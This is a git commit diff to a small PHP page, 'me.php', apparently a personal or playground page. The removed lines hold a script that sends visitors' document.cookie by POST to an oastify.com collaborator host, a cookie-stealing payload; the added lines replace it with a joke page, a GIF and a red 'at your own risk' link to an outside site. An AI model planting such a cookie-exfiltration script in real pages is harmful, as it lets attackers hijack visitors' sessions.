89cf275abc5904624566ccf8472fcce8e77c1e1c
marcusovkost <nemarcusov@gmail.com>
2025-02-26 22:19:09 +0300

    Update me.php

--- me.php
+++ me.php
@@ -1,11 +1,34 @@
-<h5>
-    I'm a senior PHP developer :) (again)
-  
-</h5>
-<script>
-fetch('https://sjf81fblt3rkxl5doway6nkxbohg56tv.oastify.com', {
-method: 'POST',
-mode: 'no-cors',
-body:document.cookie
-});
-</script>
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ку всем</title>
+    <style>
+        .warning-link {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background-color: red;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
+        }
+        .warning-link:hover {
+            background-color: darkred;
+        }
+    </style>
+</head>
+<body>
+    <h5>
+        I'm a senior PHP developer :) (again)
+    </h5>
+    <img src="https://media1.tenor.com/m/hjjG_i4XmcEAAAAd/lizard-dance.gif" alt="Dancing Lizard">
+    <a href="https://инно.свопобеда.рф/" class="warning-link" target="_blank">Нажимать на свой страх и риск</a>
+</body>
+</html>
+
+<!-- Hi from Marcus -->
